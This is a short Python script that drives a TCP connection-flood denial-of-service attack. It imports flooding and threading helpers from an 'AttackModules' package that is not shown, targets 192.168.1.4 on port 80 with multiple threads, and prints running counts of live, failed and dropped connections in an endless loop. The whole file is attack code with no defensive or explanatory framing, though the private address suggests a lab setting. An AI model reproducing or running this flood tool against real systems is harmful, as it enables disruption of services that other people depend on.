#-------------------------------- tcp connection flood

from AttackModules import ThreadMaker, ConnectionFlood
from time import sleep
import threading
import sys


program_index = 1   # does not matter

target = "192.168.1.4"
port = 80
#thread_count = 1000 
thread_count = 5 


empt = ConnectionFlood()
emptConn_funcName= empt.create_emptyConnection

arguments = {}
arguments['target'] = target
arguments['port'] = port
arguments['timeinterval'] = 10 
    

ce = ThreadMaker()
lunch = ce.lunch


t = threading.Thread(target=lunch, args=(emptConn_funcName, arguments, thread_count, ))
t.start()

count = 0
while True:
    print("realtime count: "+str(count)+\
            "----program_index: "+str(program_index)+\
                "------ empty Connection succeeded tries: #"+str(empt.connection_success_count)+\
                    "------ failed tries: #"+str(empt.connection_failed_count)+\
                        "------ droppped: #"+str(empt.connection_dropped_count)+\
                            "------ Alive: #"+str( empt.connection_success_count-empt.connection_failed_count- empt.connection_dropped_count))
    count+=1
    if(int(program_index) == 4):
        print("\n")
    sleep(3)

